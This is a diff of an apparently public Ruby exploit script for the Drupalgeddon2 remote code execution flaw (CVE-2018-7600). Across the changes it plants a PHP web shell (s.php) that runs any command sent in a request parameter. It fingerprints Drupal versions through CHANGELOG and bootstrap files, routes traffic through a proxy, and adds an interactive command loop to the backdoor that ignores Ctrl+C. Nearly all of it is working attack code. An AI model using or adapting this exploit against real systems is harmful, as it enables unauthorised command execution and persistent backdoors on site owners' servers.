@@ -1,8 +1,8 @@
 #!/usr/bin/env ruby
 #
-# [CVE-2018-7600] Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' ~ https://github.com/dreadlocked/Drupalgeddon2/
+# [CVE-2018-7600] Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' ~ https://github.com/dreadlocked/Drupalgeddon2/
 # Authors:
-# - Hans Topo ~ https://github.com/dreadlocked
+# - Hans Topo ~ https://github.com/dreadlocked // https://twitter.com/_dreadlocked
 # - g0tmi1k   ~ https://blog.g0tmi1k.com/ // https://twitter.com/g0tmi1k
 #
 
@@ -11,6 +11,7 @@ require 'base64'
 require 'json'
 require 'net/http'
 require 'openssl'
+require 'readline'
 
 
 # Proxy information (nil to disable)
@@ -20,13 +21,12 @@ proxy_port = 8080
 
 # Quick how to use
 if ARGV.empty?
-  puts "Usage: ruby drupalggedon2.rb <target> <command>"
-  puts "       ruby drupalgeddon2.rb https://example.com whoami"
+  puts "Usage: ruby drupalggedon2.rb <target>"
+  puts "       ruby drupalgeddon2.rb https://example.com"
   exit
 end
 # Read in values
 target = ARGV[0]
-command = ARGV[1]
 
 
 # Banner
@@ -45,14 +45,13 @@ end
 
 
 # Payload (we could just be happy with this, but we can do better!)
-#evil = '<?php eval($_GET[c]); ?>'
-evil = '<?php if( isset( $_REQUEST["c"] ) ) { system( $_REQUEST["c"] ); } ?>'
+#evil = '<?php if( isset( $_REQUEST["c"] ) ) { eval( $_GET[c]) ); } ?>'
+evil = '<?php if( isset( $_REQUEST["c"] ) ) { system( $_REQUEST["c"] . " 2>&1" ); }'
 evil = "echo " + Base64.strict_encode64(evil).strip + " | base64 -d | tee s.php"
 
 
 # Feedback
 puts "[*] Target : #{target}"
-puts "[*] Command: #{command}"
 puts "[*] Payload: #{evil}"
 puts "-"*80
 
@@ -63,32 +62,41 @@ drupalverion = nil
 url = [
   target + "CHANGELOG.txt",
   target + "core/CHANGELOG.txt",
+  target + "includes/bootstrap.inc",
+  target + "core/includes/bootstrap.inc",
 ]
 # Check all
 url.each do|uri|
   exploit_uri = URI(uri)
 
   # Check response
-# ***TODO PROXY THIS!
-  response = Net::HTTP.get_response(exploit_uri)
-  if response.code != "200"
-    puts "[!] MISSING: #{uri} (#{response.code})"
-  else
+  http = Net::HTTP.new(exploit_uri.host, exploit_uri.port, proxy_addr, proxy_port)
+  request = Net::HTTP::Get.new(exploit_uri.request_uri)
+  response = http.request(request)
+
+  if response.code == "200"
     puts "[+] Found  : #{uri} (#{response.code})"
     # Patched already?
     puts "[!] WARNING: Might be patched! Found SA-CORE-2018-002: #{url}" if response.body.include? "SA-CORE-2018-002"
 
     drupalverion = response.body.match(/Drupal (.*),/).to_s().slice(/Drupal (.*),/, 1).strip
-    puts "[+] Drupal : #{drupalverion}"
+    puts "[+] Drupal!: #{drupalverion}"
     # Done!
     break
+  elsif response.code == "403"
+    puts "[+] Found  : #{uri} (#{response.code})"
+
+    drupalverion = uri.match(/core/)? '8.x' : '7.x'
+    puts "[+] Drupal?: #{drupalverion}"
+  else
+    puts "[!] MISSING: #{uri} (#{response.code})"
   end
 end
 
 if not drupalverion
   puts "[!] Didn't detect Drupal version"
-  puts "[!] Focusing Drupal 8 attack"
-  drupalverion = "8.1337"
+  puts "[!] Forcing Drupal v8.x attack"
+  drupalverion = "8.x"
 end
 puts "-"*80
 
@@ -162,19 +170,40 @@ puts "-"*80
 
 
 # Feedback
-puts "[*]   curl '#{target}s.php' -d 'c=#{command}'"
+puts "[*]   curl '#{target}s.php' -d 'c=whoami'"
 puts "-"*80
 
 
-# Now run our command
-exploit_uri = URI(target + "s.php?c=#{command}")
+# Test to see if backdoor is there
+exploit_uri = URI(target + "s.php")
 # Check response
-response = Net::HTTP.get_response(exploit_uri)
-if response.code != "200"
+http = Net::HTTP.new(exploit_uri.host, exploit_uri.port, proxy_addr, proxy_port)
+request = Net::HTTP::Get.new(exploit_uri.request_uri)
+response = http.request(request)
+
+if response.code == "200"
+  puts "[*] Fake shell: "
+
+  # Stop any CTRL + C action ;)
+  trap('INT', 'SIG_IGN')
+
+  # Forever loop
+  loop do
+    # Get input
+    command = Readline.readline('drupalgeddon2> ', true)
+
+    # Exit
+    break if command =~ /exit/
+
+    # Blank link?
+    next if command.empty?
+
+    # Send request
+    req = Net::HTTP::Post.new(exploit_uri.request_uri)
+    req.body = "c=#{command}"
+    puts http.request(req).body
+  end
+else
   puts "[!] Exploit FAILED ~ Response: #{response.code}"
   exit
 end
-
-
-# Result
-puts "[+] Output: #{response.body}"
